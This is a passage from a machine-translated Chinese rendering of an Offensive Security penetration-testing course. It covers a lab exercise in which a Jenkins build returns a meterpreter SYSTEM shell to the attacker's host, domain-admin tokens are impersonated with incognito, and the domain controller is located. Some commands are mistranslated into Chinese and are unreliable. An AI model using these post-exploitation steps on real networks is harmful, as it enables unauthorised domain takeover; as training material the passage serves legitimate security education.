<div style="position:absolute;top:41409;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">保存配置后，我们选择</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Build Now</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">并等待 meterpreter shell。</font></font></nobr></div>
<div style="position:absolute;top:41442;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">构建将显示为失败，但是，如果我们查看 msfconsole，我们仍然会获得一个 SYSTEM shell。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:41477;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] 发送阶段（180291 字节）到 10.11.1.250</font></font></nobr></div>
<div style="position:absolute;top:41494;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] Meterpreter 会话 4 在 15:03:00 打开 (10.11.0.4:80 -&gt; 10.11.1.250:3261)</font></font></nobr></div>
<div style="position:absolute;top:41528;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Meterpreter &gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">外壳</font></font></font></b></nobr></div>
<div style="position:absolute;top:41545;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:41579;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">C:\Windows\system32&gt; </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">whoami</font></font></font></b></nobr></div>
<div style="position:absolute;top:41596;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我是谁</font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:41612;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">nt权限\系统</font></font></b></nobr></div>
</span></font>

<div style="position:absolute;top:41755;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="36"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 36 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:41788;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:42865;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:42865;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:42865;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">845</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:41900;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">C:\Windows\system32&gt;</font></font></nobr></div>
<div style="position:absolute;top:41920;left:357"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 997 - 获取系统 shell</font></font></i></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:41951;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">24.8.5</font></font></i></nobr></div>
<div style="position:absolute;top:41951;left:217"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">开发后枚举</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:41989;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们已经对 Cevapi 目标进行了一些基本的枚举。</font><font style="vertical-align: inherit;">在这个阶段，我们</font></font></nobr></div>
<div style="position:absolute;top:42008;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">将专注于更接近我们既定的目标，域管理员。</font></font></nobr></div>
<div style="position:absolute;top:42041;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">早些时候，我们发现 Cevapi 实际上加入了 sandbox.local 域。</font><font style="vertical-align: inherit;">让我们来看看</font></font></nobr></div>
<div style="position:absolute;top:42060;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">查看是否有任何域帐户为我们登录以模拟他们的令牌。</font><font style="vertical-align: inherit;">类似于我们如何</font></font></nobr></div>
<div style="position:absolute;top:42080;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">经过测试的 Poultry，我们将再次使用 Meterpreter 中的隐身扩展来列出所有可用的</font></font></nobr></div>
<div style="position:absolute;top:42099;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">令牌。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:42134;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">C:\Windows\system32&gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">退出</font></font></font></b></nobr></div>
<div style="position:absolute;top:42151;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">出口</font></font></nobr></div>
<div style="position:absolute;top:42185;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Meterpreter &gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用隐身模式</font></font></font></b></nobr></div>
<div style="position:absolute;top:42202;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">加载扩展隐身...成功。</font></font></nobr></div>
<div style="position:absolute;top:42236;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">meterpreter &gt; </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">list_tokens -u</font></font></font></b></nobr></div>
<div style="position:absolute;top:42270;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">可用的委托代币</font></font></nobr></div>
<div style="position:absolute;top:42287;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">========================================</font></font></nobr></div>
<div style="position:absolute;top:42304;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">CEVAPI\cevapiadmin</font></font></nobr></div>
<div style="position:absolute;top:42321;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">CEVAPI\詹金斯用户</font></font></nobr></div>
<div style="position:absolute;top:42337;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">字体驱动主机\UMFD-0</font></font></nobr></div>
<div style="position:absolute;top:42354;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">字体驱动主机\UMFD-1</font></font></nobr></div>
<div style="position:absolute;top:42372;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">NT当局\当地服务</font></font></nobr></div>
<div style="position:absolute;top:42389;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">NT 权威\网络服务</font></font></nobr></div>
<div style="position:absolute;top:42406;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">NT权限\系统</font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:42422;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">沙箱\管理员</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:42439;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">窗口管理器\DWM-1</font></font></nobr></div>
<div style="position:absolute;top:42473;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">可用的模拟令牌</font></font></nobr></div>
<div style="position:absolute;top:42490;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">========================================</font></font></nobr></div>
<div style="position:absolute;top:42507;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">NT 权威\匿名登录</font></font></nobr></div>
<div style="position:absolute;top:42527;left:307"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 998 - 列出可以模拟的令牌</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:42556;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">似乎 sandbox.local 管理员用户已登录 Cevapi。</font><font style="vertical-align: inherit;">让我们尝试冒充</font></font></nobr></div>
<div style="position:absolute;top:42575;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">此用户以验证我们是否可以升级我们的权限。</font><font style="vertical-align: inherit;">为此，我们将使用</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:13px;font-family:Times">
<div style="position:absolute;top:42595;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">impersonate_token</font></font></b><font style="font-size:14px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令并指定管理员用户。</font><font style="vertical-align: inherit;">我们将不得不逃避“\”</font></font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:42614;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">字符以便 Metasploit 正确读取命令。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:42649;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">meterpreter &gt; </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">impersonate_token 沙箱\\管理员</font></font></font></b></nobr></div>
<div style="position:absolute;top:42666;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[+] 委托代币可用</font></font></nobr></div>
<div style="position:absolute;top:42683;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[+] 成功模拟用户沙箱\管理员</font></font></nobr></div>
<div style="position:absolute;top:42717;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Meterpreter &gt; </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">getuid</font></font></font></b></nobr></div>
<div style="position:absolute;top:42734;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">服务器用户名：沙箱\管理员</font></font></nobr></div>
<div style="position:absolute;top:42768;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Meterpreter &gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">外壳</font></font></font></b></nobr></div>
<div style="position:absolute;top:42785;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">进程 7276 已创建。</font></font></nobr></div>
<div style="position:absolute;top:42802;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">频道 3 已创建。</font></font></nobr></div>
<div style="position:absolute;top:42819;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Microsoft Windows [版本 10.0.15063] </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:42943;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="37"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 37 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:42976;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:44053;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:44053;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:44053;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">846</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:43072;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">(c) 2017 年微软公司。</font><font style="vertical-align: inherit;">版权所有。</font></font></nobr></div>
<div style="position:absolute;top:43105;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">C:\Windows\system32&gt; </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">whoami</font></font></font></b></nobr></div>
<div style="position:absolute;top:43122;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我是谁</font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:43140;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">沙箱\管理员</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:43173;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">C:\Windows\system32&gt;</font></font></nobr></div>
<div style="position:absolute;top:43193;left:303"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 999 - 模拟沙箱管理员</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:43222;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">成功！</font><font style="vertical-align: inherit;">我们现在以沙箱\管理员用户身份运行。</font><font style="vertical-align: inherit;">接下来，我们需要验证这个</font></font></nobr></div>
<div style="position:absolute;top:43241;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">确实是管理用户。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:43276;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">C:\Windows\system32&gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">网络用户/域管理员</font></font></font></b></nobr></div>
<div style="position:absolute;top:43293;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">网络用户/域管理员</font></font></nobr></div>
<div style="position:absolute;top:43310;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">该请求将在域 sandbox.local 的域控制器上进行处理。</font></font></nobr></div>
<div style="position:absolute;top:43327;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:43361;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">允许登录时间    </font></font></nobr></div>
<div style="position:absolute;top:43361;left:344"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">全部</font></font></nobr></div>
<div style="position:absolute;top:43395;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">本地组成员 *管理员 *远程桌面用户 </font></font></nobr></div>
<div style="position:absolute;top:43412;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">全局组成员资格 *</font></font><b><font color="#c00000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">域管理员</font></font></font></b></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:43412;left:522"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">*企业管理员</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:43429;left:344"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">*域用户    </font></font></nobr></div>
<div style="position:absolute;top:43429;left:522"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">*架构管理员    </font></font></nobr></div>
<div style="position:absolute;top:43446;left:344"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">*组策略创建者 </font></font></nobr></div>
<div style="position:absolute;top:43463;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令成功完成。</font></font></nobr></div>
<div style="position:absolute;top:43482;left:300"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 1000 - 检查管理员权限</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:43512;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">优秀的！</font><font style="vertical-align: inherit;">如清单 1000 所示，管理员用户是域管理员的一部分，并且</font></font></nobr></div>
<div style="position:absolute;top:43531;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">企业管理员组。 </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:44131;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="38"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 38 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:44164;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:45241;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:45241;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:45241;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">847</font></font></nobr></div>
</span></font>
<font size="2" color="#ffffff" face="Times"><span style="font-size:5px;font-family:Times;color:#ffffff">
<div style="position:absolute;top:44254;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">24.8.5.1.1</font></font></nobr></div>
</span></font>
<font size="4" color="#0070c0" face="Times"><span style="font-size:22px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:44279;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">24.9 以域控制器为目标</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:44321;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">此时，我们已经入侵了两台 Linux 服务器，Ajla 和 Zora。</font><font style="vertical-align: inherit;">使用 Zora 的内部网络</font></font></nobr></div>
<div style="position:absolute;top:44340;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">访问，我们能够转向家禽。</font><font style="vertical-align: inherit;">这位主持人让我们初步了解了内部</font></font></nobr></div>
<div style="position:absolute;top:44360;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">领域。</font><font style="vertical-align: inherit;">从这里开始，我们破坏了 Cevapi，我们只是冒充了沙箱</font></font></nobr></div>
<div style="position:absolute;top:44379;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Cevapi 上的管理员令牌。</font><font style="vertical-align: inherit;">我们现在需要使用模拟来访问</font></font></nobr></div>
<div style="position:absolute;top:44398;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">域控制器。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:44801;left:350"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 373：直流网络图</font></font></i></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:44832;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">24.9.1</font></font></i></nobr></div>
<div style="position:absolute;top:44832;left:217"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">利用域控制器</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:44870;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">通过以域管理员用户身份运行命令的能力，我们可以获得访问权限的一种方式</font></font></nobr></div>
<div style="position:absolute;top:44890;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">域控制器通过使用 PowerShell </font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">New-PSSession</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> cmdlet 打开一个新会话</font></font></nobr></div>
<div style="position:absolute;top:44909;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">针对远程主机。</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">751</font></font></font></nobr></div>
<div style="position:absolute;top:44942;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">为此，我们将首先尝试发现域控制器的主机名，以确保我们</font></font></nobr></div>
<div style="position:absolute;top:44961;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">定位正确的服务器。</font><font style="vertical-align: inherit;">为了发现主机名，我们将使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">nslookup</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">752</font></font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:44996;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">C:\Windows\system32&gt; </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">nslookup</font></font></font></b></nobr></div>
<div style="position:absolute;top:45013;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">nslookup</font></font></nobr></div>
<div style="position:absolute;top:45030;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">DNS 请求超时。</font></font></nobr></div>
<div style="position:absolute;top:45047;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">超时为 2 秒。</font></font></nobr></div>
<div style="position:absolute;top:45064;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">默认服务器：未知</font></font></nobr></div>
<div style="position:absolute;top:45081;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">地址：10.5.5.30</font></font></nobr></div>
<div style="position:absolute;top:45115;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">&gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">设置类型=全部</font></font></font></b></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:45171;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">751 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（微软，2020 年），https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/new-pssession</font></font></font></nobr></div>
<div style="position:absolute;top:45191;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">752 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（服务器故障，2010 年），https://serverfault.com/a/78093</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:45319;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="39"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 39 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:45352;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:46429;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:46429;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:46429;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">848</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:45448;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">&gt; </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">_ldap._tcp.dc._msdcs.sandbox.local</font></font></font></b></nobr></div>
<div style="position:absolute;top:45464;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">服务器：未知</font></font></nobr></div>
<div style="position:absolute;top:45481;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">地址：10.5.5.30</font></font></nobr></div>
<div style="position:absolute;top:45516;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">_ldap._tcp.dc._msdcs.sandbox.local SRV服务位置：</font></font></nobr></div>
<div style="position:absolute;top:45532;left:190"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">优先级 = 0</font></font></nobr></div>
<div style="position:absolute;top:45549;left:190"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">重量    </font></font></nobr></div>
<div style="position:absolute;top:45549;left:311"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">= 100</font></font></nobr></div>
<div style="position:absolute;top:45566;left:190"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">港口    </font></font></nobr></div>
<div style="position:absolute;top:45566;left:311"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">= 389</font></font></nobr></div>
<div style="position:absolute;top:45583;left:190"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">svr 主机名 = SANDBOXDC.sandbox.local</font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:45600;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">SANDBOXDC </font></font></b><font color="#000000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">.sandbox.local 互联网地址 = 10.5.5.30</font></font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:45617;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">&gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">退出</font></font></font></b></nobr></div>
<div style="position:absolute;top:45651;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">C:\Windows\system32&gt;</font></font></nobr></div>
<div style="position:absolute;top:45670;left:328"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 1001 - nslookup 发现主机名</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:45700;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">不带任何选项</font><font style="vertical-align: inherit;">运行</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">nslookup</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">以交互模式启动它，允许我们设置</font></font></nobr></div>
<div style="position:absolute;top:45719;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们正在寻找的记录。</font><font style="vertical-align: inherit;">在这种情况下，我们正在寻找的类型是“all”。</font><font style="vertical-align: inherit;">接下来，我们进行查找</font></font></nobr></div>
<div style="position:absolute;top:45739;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">sandbox.local 域中</font><font style="vertical-align: inherit;">的</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">_ldap._tcp.dc._msdcs_</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">条目。</font><font style="vertical-align: inherit;">这导致 nslookup 返回</font></font></nobr></div>
<div style="position:absolute;top:45758;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">域控制器的主机名。</font></font></nobr></div>
<div style="position:absolute;top:45791;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">获取主机名后，我们</font><font style="vertical-align: inherit;">将从我们的 Meterpreter shell 中</font><font style="vertical-align: inherit;">启动</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">powershell</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
